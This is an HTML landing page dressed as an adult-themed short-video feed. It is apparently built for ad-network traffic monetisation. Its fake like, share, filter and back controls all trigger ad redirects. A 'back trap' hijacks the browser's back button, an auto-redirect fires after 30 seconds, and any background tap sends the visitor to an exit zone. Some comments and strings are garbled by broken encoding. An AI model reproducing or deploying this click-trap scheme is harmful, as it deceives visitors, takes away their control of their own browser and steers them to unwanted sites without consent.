<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

  <title>(1) Private Video Request</title>
  <link rel="icon" href='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="%23ff0000"/><path d="M35 30 L75 50 L35 70 Z" fill="%23ffffff"/></svg>'>

  <script>
    var APP_CONFIG = {
      domain: "https://jup9.com",
      clickMapMode: "reels",

      // --- MAIN EXIT (dual) ---
      mainExit_currentTab_zoneId: 10217421,
      mainExit_newTab_zoneId: 10217420,

      // --- TABUNDER (used by micro-handoff only, optional) ---
      tabUnderClick_zoneId: 10217421,

      // --- AGE EXIT (dual) ---
      ageExit_currentTab_zoneId: 10217421,
      ageExit_newTab_zoneId: 10217420,

      // --- AUTOEXIT (current tab) ---
      autoexit_zoneId: 10217422,
      autoexit_timeToRedirect: 30,

      // --- REVERSE (popstate -> current tab) ---
      reverse_zoneId: 10217419,

      // --- BACK QUEUE ---
      back_zoneId: 10217423,
      back_count: 6
    };
  </script>

  <style>
    * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
    html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; background: #000; }

    .video-layer {
      position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover;
      z-index: 0; background: #000; opacity: 0; transition: opacity 0.1s linear; pointer-events: none;
    }
    .video-layer.active { opacity: 1; z-index: 1; }

    .reels-ui {
      position: absolute; inset: 0; z-index: 10;
      display: flex; flex-direction: column; justify-content: space-between;
      pointer-events: none;
      background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.8) 100%);
    }

    /* --- NEXT BUTTON (Stage 1) --- */
    .next-btn-wrap {
      position: absolute;
      right: 14px;
      top: 55%;
      transform: translateY(-50%);
      z-index: 60;
      pointer-events: auto;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .next-btn {
      width: 58px; height: 58px; border-radius: 999px;
      background: rgba(30,30,30,0.75); border: 1px solid rgba(255,255,255,0.18);
      backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.45); cursor: pointer; animation: pulseNext 1.7s infinite;
    }
    .next-icon { width: 26px; height: 26px; fill: none; stroke: #fff; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }

    @keyframes pulseNext {
      0%, 100% { transform: scale(1); }
      70% { transform: scale(1.06); }
    }

    /* --- STAGE 2 CTA --- */
    .click-hint-overlay {
      position: absolute; top: 44%; left: 50%; transform: translate(-50%, -50%);
      z-index: 50; display: none; flex-direction: column; align-items: center; width: 100%;
    }
    .glass-btn {
      display: flex; align-items: center; gap: 12px; background: rgba(20, 20, 20, 0.45);
      backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.15);
      padding: 14px 28px; border-radius: 40px; cursor: pointer; animation: pulseGlass 2s infinite; pointer-events: auto;
    }

    /* --- –ò–°–ü–†–ê–í–õ–ï–ù–ù–´–ô –°–¢–ò–õ–¨ –ö–ù–û–ü–û–ö –°–õ–ï–í–ê (–ü–û–î–ù–Ø–õ –í–´–®–ï) --- */
    .right-actions {
      position: absolute; 
      left: 12px; 
      bottom: 160px; /* –ü–æ–¥–Ω—è–ª –≤—ã—à–µ, —á—Ç–æ–±—ã –Ω–µ –ø–µ—Ä–µ–∫—Ä—ã–≤–∞—Ç—å –∏–Ω—Ñ–æ */
      display: flex; flex-direction: column; align-items: center; gap: 20px;
      pointer-events: auto;
    }
    .action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .icon-circle { width: 44px; height: 44px; background: rgba(50, 50, 50, 0.6); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
    .action-icon { width: 24px; height: 24px; }
    .action-text { font-size: 13px; font-weight: 600; color: #fff; }

    /* --- –ò–°–ü–†–ê–í–õ–ï–ù–ù–´–ô –°–¢–ò–õ–¨ –û–ü–ò–°–ê–ù–ò–Ø (–°–î–í–ò–ù–£–õ –í–õ–ï–í–û) --- */
    .bottom-info { 
      padding: 16px 12px; 
      color: #fff; 
      pointer-events: auto; 
      width: 100%; 
      margin-left: 0; /* –£–±—Ä–∞–ª –æ—Ç—Å—Ç—É–ø, —Ç–µ–ø–µ—Ä—å –≤—Å—ë —Å–ª–µ–≤–∞ */
    }
    .user-row { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
    .avatar { width: 40px; height: 40px; border-radius: 50%; background: #ff0050; border: 2px solid #fff; }
    .username { font-weight: 700; font-size: 16px; }
    .desc { font-size: 15px; line-height: 1.4; opacity: 0.9; }

    .top-bar { padding: 50px 16px 20px; display: flex; justify-content: space-between; pointer-events: auto; }
    .swipe-hint { position: absolute; right: 90px; top: 55%; transform: translateY(-50%); z-index: 70; pointer-events: none; }
    .hand-icon { font-size: 44px; animation: hintRight 1.35s infinite ease-in-out; }
    
    @keyframes hintRight {
      0% { transform: translateX(-15px); opacity: 0; }
      50% { opacity: 1; }
      100% { transform: translateX(10px); opacity: 0; }
    }
    .shake { animation: shake 0.4s both; }
    @keyframes shake {
      20% { transform: translate3d(-4px, 0, 0); }
      40% { transform: translate3d(4px, 0, 0); }
      60% { transform: translate3d(-4px, 0, 0); }
      80% { transform: translate3d(4px, 0, 0); }
    }

    .slide-out-up { animation: slideOutUp 0.45s forwards; }
    .slide-in-up  { animation: slideInUp  0.45s forwards; visibility: visible !important; z-index: 2 !important; }
    @keyframes slideOutUp { 100% { transform: translateY(-100%); } }
    @keyframes slideInUp  { 0% { transform: translateY(100%); } 100% { transform: translateY(0); } }
  </style>

  <script defer src="./assets/scripts/common.js?v=3.1"></script>
</head>

<body>
  <div class="reels-wrapper" id="click-trap">
    <video id="v1" class="video-layer active" playsinline webkit-playsinline muted loop preload="auto"></video>
    <video id="v2" class="video-layer" playsinline webkit-playsinline muted loop preload="auto"></video>

    <div id="swipe-hint" class="swipe-hint"><div class="hand-icon">üëâ</div></div>

    <div class="next-btn-wrap" id="next-wrap">
      <div class="next-btn" id="next-btn" aria-label="Next">
        <svg class="next-icon" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </div>
    </div>

    <div id="click-hint" class="click-hint-overlay">
      <div class="glass-btn" data-mt="mainExit" data-stop="1">
        <svg class="glass-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg>
        <span class="glass-text" id="lang-text">Continue Watching</span>
      </div>
    </div>

    <div class="reels-ui">
      <div class="top-bar">
        <svg class="back-icon" data-mt="reverse" data-stop="1" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="15 18 9 12 15 6"></polyline>
        </svg>

        <div class="filter-pill" data-mt="mainExit" data-stop="1">
          <svg class="filter-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
            <polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"></polygon>
          </svg>
          <span>Filters</span>
        </div>
      </div>

      <div class="right-actions">
        <div class="action-btn" data-mt="mainExit" data-stop="1">
          <div class="icon-circle">
            <svg class="action-icon" viewBox="0 0 24 24" fill="white" stroke="none">
              <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
            </svg>
          </div>
          <span class="action-text" id="ui-likes">93</span>
        </div>

        <div class="action-btn" data-mt="mainExit" data-stop="1">
          <div class="icon-circle">
            <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linejoin="round">
              <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path>
            </svg>
          </div>
          <span class="action-text">Share</span>
        </div>

        <div class="action-btn" data-mt="ageExit" data-stop="1">
          <div class="icon-circle">
            <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M14.5 4l-9.5 9.5a2.5 2.5 0 0 0 3.5 3.5l9.5-9.5"/>
              <path d="M18 7L21 4" stroke-width="2.5"/><path d="M14 10L12 7" stroke-width="2"/><path d="M20 10L22 13" stroke-width="2"/>
              <path d="M19.5 2.5l1 1-1 1-1-1 1-1z" fill="white" stroke="none"/>
            </svg>
          </div>
        </div>

        <div class="dots-menu"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
      </div>

      <div class="bottom-info">
        <div class="user-row"><div class="avatar" id="ui-avatar"></div><div class="username" id="ui-username">@Sweet_Alice</div></div>
        <div class="desc" id="ui-desc">Do you like my view? üòà <br>Check link in bio... üëá</div>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const reelsData = [
        {},
        { user: "@Sweet_Alice", likes: "93", desc: "Do you like my view? üòà <br>Check link in bio... üëá", color: "#ff0050" },
        { user: "@Naughty_Kate", likes: "12.4k", desc: "Wait for the end... üí¶ <br>Link in bio!", color: "#0095f6" }
      ];

      const translations = {
        en: "Continue Watching", ru: "–°–º–æ—Ç—Ä–µ—Ç—å –¥–∞–ª—å—à–µ", es: "Continuar viendo", de: "Weiter ansehen",
        fr: "Continuer √† regarder", pt: "Continuar assistindo", it: "Continua a guardare", tr: "ƒ∞zlemeye devam et",
        ar: "ŸÖÿ™ÿßÿ®ÿπÿ© ÿßŸÑŸÖÿ¥ÿßŸáÿØÿ©", zh: "ÁªßÁª≠ËßÇÁúã", ja: "Ë¶ñËÅ¥„ÇíÁ∂ö„Åë„Çã", ko: "Í≥ÑÏÜç ÏãúÏ≤≠ÌïòÍ∏∞", hi: "‡§¶‡•á‡§ñ–Ω–∞—è ‡§ú‡§æ‡§∞‡•Ä ‡§∞‡§ñ‡•á‡§Ç",
        id: "Lanjutkan Menonton", vi: "Ti·∫øp t·ª•c xem", th: "‡∏î‡∏π‡∏ï‡πà‡∏≠"
      };

      const vib = (ms=25) => { try { navigator.vibrate && navigator.vibrate(ms); } catch {} };

      const userLang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2).toLowerCase();
      const langText = document.getElementById("lang-text");
      langText.innerText = translations[userLang] || translations.en;
      if (userLang === 'ar') document.querySelector('.glass-btn').style.direction = 'rtl';

      const v1 = document.getElementById('v1');
      const v2 = document.getElementById('v2');
      const swipeHint = document.getElementById("swipe-hint");
      const clickHint = document.getElementById("click-hint");
      const wrapper = document.querySelector('.reels-wrapper');

      const nextWrap = document.getElementById("next-wrap");
      const nextBtn  = document.getElementById("next-btn");

      const uiUser = document.getElementById('ui-username');
      const uiLikes = document.getElementById('ui-likes');
      const uiDesc = document.getElementById('ui-desc');
      const uiAvatar = document.getElementById('ui-avatar');

      const urlParams = new URLSearchParams(window.location.search);
      const offerID = urlParams.get('v') || '1';
      const getPath = (index) => `./assets/videos/lend${offerID}/reels-${index}.mp4`;

      v1.src = getPath(1);
      v1.play().catch(()=>{});
      v2.src = getPath(2);
      v2.load();

      let stage = 1;
      let touchStartY = 0;
      let touchEndY = 0;
      let isAnimating = false;

      function armBackTrap() {
        if (window.__BACK_ARMED_ON_STAGE2__) return;
        try {
          if (window.LANDING_EXITS?.initBack) {
            window.LANDING_EXITS.initBack();
            window.__BACK_ARMED_ON_STAGE2__ = true;
            return;
          }
          const tick = setInterval(() => {
            if (window.LANDING_EXITS?.initBack) {
              window.LANDING_EXITS.initBack();
              window.__BACK_ARMED_ON_STAGE2__ = true;
              clearInterval(tick);
            }
          }, 50);
          setTimeout(() => clearInterval(tick), 2500);
        } catch {}
      }

      function doSwapToStage2() {
        if (isAnimating) return;
        isAnimating = true;

        swipeHint.style.display = 'none';
        nextWrap.style.display = 'none';

        v1.classList.add('slide-out-up');
        v2.classList.add('slide-in-up');
        v2.play().catch(()=>{});

        const newData = reelsData[2];
        if (newData) {
          uiUser.innerText = newData.user;
          uiLikes.innerText = newData.likes;
          uiDesc.innerHTML = newData.desc;
          uiAvatar.style.backgroundColor = newData.color;
        }

        setTimeout(() => {
          v1.classList.remove('active', 'slide-out-up');
          v1.pause();
          v2.classList.add('active');
          v2.classList.remove('slide-in-up');

          clickHint.style.display = 'flex';
          stage = 2;
          isAnimating = false;
        }, 450);
      }

      // NEXT click
      nextBtn.addEventListener("click", (e) => {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        armBackTrap();
        doSwapToStage2();
      }, true);

      // TOUCH LOGIC: Shake and Vibrate
      wrapper.addEventListener('touchstart', (e) => {
        touchStartY = e.changedTouches[0].screenY;
      }, { passive: true });

      wrapper.addEventListener('touchend', (e) => {
        touchEndY = e.changedTouches[0].screenY;
        if (touchStartY - touchEndY > 50) {
          vib(40); // –í–ò–ë–†–ê–¶–ò–Ø –ø—Ä–∏ —Å–≤–∞–π–ø–µ
          if (stage === 1 && nextBtn) {
            nextBtn.classList.remove('shake');
            void nextBtn.offsetWidth;
            nextBtn.classList.add('shake');
          } else if (stage === 2) {
            const btn = document.querySelector('.glass-btn');
            if (btn) {
              btn.classList.remove('shake');
              void btn.offsetWidth;
              btn.classList.add('shake');
            }
          }
        }
      }, { passive: true });

      // Background clicks
      wrapper.addEventListener("click", (e) => {
        if (e.target?.closest?.("[data-mt]")) return; 
        if (e.target === nextBtn || e.target?.closest?.("#next-btn")) return;

        if (stage === 1) {
            // –¢–ï–ü–ï–†–¨ –ú–û–ñ–ù–û –ü–ï–†–ï–ô–¢–ò –ù–ê 2 –≠–ö–†–ê–ù –ü–û –í–ò–î–ï–û
            armBackTrap();
            doSwapToStage2();
        } else if (stage === 2) {
          e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
          window.LANDING_EXITS?.run?.("mainExit");
        }
      }, true);
    });
  </script>
</body>
</html>
